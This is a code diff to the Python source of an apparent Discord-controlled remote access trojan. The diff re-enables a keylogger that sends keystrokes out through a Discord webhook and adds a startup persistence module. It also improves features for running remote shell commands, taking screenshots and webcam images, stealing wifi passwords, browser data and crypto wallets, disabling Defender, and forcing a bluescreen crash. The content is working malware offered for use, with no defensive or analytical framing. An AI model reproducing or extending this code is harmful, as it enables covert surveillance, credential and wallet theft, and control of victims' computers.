@@ -1,13 +1,14 @@
-import os, discord, subprocess, requests, ctypes, sys, zipfile
+import os, discord, subprocess, requests, ctypes, zipfile
 from PIL import ImageGrab, Image
 import cv2
 from tkinter import messagebox
 from config import TOKEN, GUILD_ID, DEFENDER, ERROR
 from modules.browser import run, delete_files
-#from modules.keylogger import Keylogger
+from modules.keylogger import Keylogger
 from modules.info import start
 from modules.wifi import WifiPasswords
 from pyperclip import paste
+from modules.startup import Startup
 
 
 def disable_defender():
@@ -32,6 +33,7 @@ if ERROR:
 login = os.getlogin()
 client = discord.Client(intents=discord.Intents.all())
 session_id = os.urandom(8).hex()
+original_dir = os.getcwd()
 
 start()
 with open("system.txt", "r") as f:
@@ -62,15 +64,6 @@ commands = "\n".join([
     "!quit - Exit session without deleting all the data",
     "!exit - Exit session and delete all data"
 ])
-
-
-def startup(file_path=""):
-    temp = os.getenv("TEMP")
-    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % login
-    if file_path == "":
-        file_path = sys.argv[0]
-    with open(bat_path + '\\' + "Update.bat", "w+") as bat_file:
-        bat_file.write(r'start "" "%s"' % file_path)
 
 
 async def wallets(channel):
@@ -176,6 +169,9 @@ async def on_message(message):
             with open("system.txt", "r") as f:
                 system_info = f.read()
 
+            if system_info == "":
+                system_info = "Failed to fetch system information!"
+            
             embed = discord.Embed(title="System Information", description=f"```{system_info}```", color=0xfafafa)
             await message.channel.send(embed=embed)
             delete_files(["system.txt"])
@@ -229,6 +225,16 @@ async def on_message(message):
         files = "\n".join(os.listdir())
         if files == "":
             files = "No Files Found"
+            
+        elif len(files) > 1500:
+            with open("files.txt", "w", encoding="utf-8") as f:
+                f.write(files)
+            file = discord.File("files.txt")
+            embed = discord.Embed(title=f"Files > {os.getcwd()}", description="", color=0xfafafa)
+            await message.reply(file=file, embed=embed)
+            delete_files(["files.txt"])
+            return
+        
         embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
         await message.reply(embed=embed)
         
@@ -260,13 +266,31 @@ async def on_message(message):
         error_output = output[1].decode("utf-8")
         normal_output = output[0].decode("utf-8")
         
-        embed = discord.Embed(title=f"{os.getcwd()}", description="", color=0xfafafa) # description=f"```{output}```",
+        embed = discord.Embed(title=f"{os.getcwd()}", description="", color=0xfafafa)
         
-        if normal_output != "":
+        if len(normal_output) > 1500:
+            with open("output.txt", "w", encoding="utf-8") as f:
+                f.write(normal_output)
+            
+            file = discord.File("output.txt")
+            await message.reply(file=file, embed=embed)
+            delete_files(["output.txt"])
+            return
+        elif normal_output != "":
             embed.add_field(name="Output", value=f"```{normal_output}```", inline=False)
             
-        if error_output != "":
+             
+        if len(error_output) > 1500:
+            with open("error.txt", "w", encoding="utf-8") as f:
+                f.write(error_output)
+            
+            file = discord.File("error.txt")
+            await message.reply(file=file, embed=embed)
+            delete_files(["error.txt"])
+            return      
+        elif error_output != "":
             embed.add_field(name="Error", value=f"```{error_output}```", inline=False)
+            
             
         if error_output == "" and normal_output == "":
             embed.add_field(name="Output", value="```No Output!```", inline=False)
@@ -282,11 +306,29 @@ async def on_message(message):
         
         embed = discord.Embed(title=f"{os.getcwd()}", description="", color=0xfafafa) # description=f"```{output}```",
         
-        if normal_output != "":
-            embed.add_field(name="Output", value=f"```{normal_output}```", inline=False)
+        if len(normal_output) > 1500:
+            with open("output.txt", "w", encoding="utf-8") as f:
+                f.write(normal_output)
             
-        if error_output != "":
+            file = discord.File("output.txt")
+            await message.reply(file=file, embed=embed)
+            delete_files(["output.txt"])
+            return
+        elif normal_output != "":
+            embed.add_field(name="Output", value=f"```{normal_output}```", inline=False)
+
+
+        if len(error_output) > 1500:
+            with open("error.txt", "w", encoding="utf-8") as f:
+                f.write(error_output)
+            
+            file = discord.File("error.txt")
+            await message.reply(file=file, embed=embed)
+            delete_files(["error.txt"])
+            return
+        elif error_output != "":
             embed.add_field(name="Error", value=f"```{error_output}```", inline=False)
+            
             
         if error_output == "" and normal_output == "":
             embed.add_field(name="Output", value="```No Output!```", inline=False)
@@ -306,17 +348,22 @@ async def on_message(message):
         embed = discord.Embed(title="Started", description=f"```{file}\n{output}```", color=0xfafafa)
         await message.reply(embed=embed)
     
-    elif message.content.startswith("startup"):
-        await startup()
+    elif message.content == "startup":
+        Startup(original_dir)
         await message.reply("Startup Enabled!")
         
         
     elif message.content == "bluescreen":
         await message.reply("Attempting...", delete_after=.1)
-        ntdll = ctypes.windll.ntdll
-        prev_value = ctypes.c_bool()
-        res = ctypes.c_ulong()
-        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
+        try:
+            ntdll = ctypes.windll.ntdll
+            prev_value = ctypes.c_bool()
+            res = ctypes.c_ulong()
+            ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
+        except:
+            await message.reply("Bluescreen Failed!")
+            return
+        
         if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
             await message.reply("Bluescreen Successful!")
         else:
@@ -329,6 +376,12 @@ async def on_message(message):
             wifi = f.read()
         if wifi == "":
             wifi = "No wifi passwords found!"
+        elif len(wifi) > 1500:
+            file = discord.File("wifi.txt")
+            await message.reply(file=file)
+            delete_files(["wifi.txt"])
+            return
+        
         embed = discord.Embed(title="Wifi Passwords", description=f"```{wifi}```", color=0xfafafa)
         await message.reply(embed=embed)
         delete_files(["wifi.txt"])
@@ -338,6 +391,7 @@ async def on_message(message):
         try:
             screenshot = ImageGrab.grab(all_screens=True)
         except:
+            await message.reply("Failed to take screenshot!")
             return
         path = os.path.join(os.getenv("TEMP"), "screenshot.png")
         screenshot.save(path)
@@ -358,6 +412,7 @@ async def on_message(message):
             image.save(path)
             cap.release()
         except:
+            await message.reply("Failed to take webcam image!")
             return
         webcam = discord.File(path)
         embed = discord.Embed(title="Webcam", color=0xfafafa)
@@ -371,16 +426,17 @@ async def on_message(message):
         await wallets(message.channel)
     
 
-    #elif message.content == "keylogger":
-    #    await message.reply("Creating new webhook for keylogger...")
-    #    try:
-    #        webhook = await message.channel.create_webhook(name="Keylogger").url
-    #        await message.reply(f"Created webhook, using URL: {webhook}")
-    #        Keylogger(webhook).run()
-    #    except:
-    #        return
-    #    
-    #    await message.reply("Keylogger enabled!")
+    elif message.content == "keylogger":
+        await message.reply("Creating new webhook for keylogger...")
+        try:
+            webhook = await message.channel.create_webhook(name="Keylogger").url
+            await message.reply(f"Created webhook, using URL: {webhook}")
+            Keylogger(webhook).run()
+        except:
+            await message.reply("Failed to create new webhook!")
+            return
+        
+        await message.reply("Keylogger enabled!")
        
     elif message.content == "!quit":
         await client.close()
@@ -397,3 +453,7 @@ try:
     client.run(TOKEN)
 except:
     pass
+
+
+#C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+#C:\Users\Korisnik\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
